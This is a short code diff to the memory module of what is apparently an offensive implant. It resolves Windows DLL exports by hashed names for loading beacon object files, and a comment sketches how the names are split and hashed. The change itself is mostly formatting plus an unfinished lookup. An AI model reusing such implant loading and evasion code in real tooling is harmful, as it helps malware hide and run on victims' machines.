@@ -296,8 +296,20 @@ namespace Memory {
                 return address;
             } else {
                 char *lib_name = { };
+                char *fn_name = { };
+                /*
+                 * ok, hear me out:
+                 *      auto name = "NTDLL$NtAllocateVirtualMemory"
+                 *      map[][] = strings.Split(name, "$")
+                 *
+                 *      auto module = GetHashFromString(map[0])
+                 *      auto function = GetHashFromString(map[1])
+                 *
+                 *      LoadExport(module, function);
+                 *      the implant loads the BOF, so it needs to resolve/relocate everything for it
+                 */
 
-                address = Memory::Modules::LoadExport(lib_name, id);
+                address = Memory::Modules::LoadExport(lib_name, fn_name);
                 return address;
             }
         }
@@ -337,8 +349,9 @@ namespace Memory {
         }
 
         FARPROC GetExportAddress(const HMODULE base, const uint32_t hash) {
-            FARPROC address = {};
-            char lowercase[MAX_PATH] = {};
+
+            FARPROC address = { };
+            char lowercase[MAX_PATH] = { };
 
             const auto dos_head = IMAGE_DOS_HEADER(base);
             const auto nt_head = IMAGE_NT_HEADERS(base, dos_head);
@@ -434,8 +447,8 @@ namespace Memory {
             }
 
             x_memset(buffer, 0, size);
-            Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, buffer);
 
+            Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, buffer);
             return address;
         }
     }
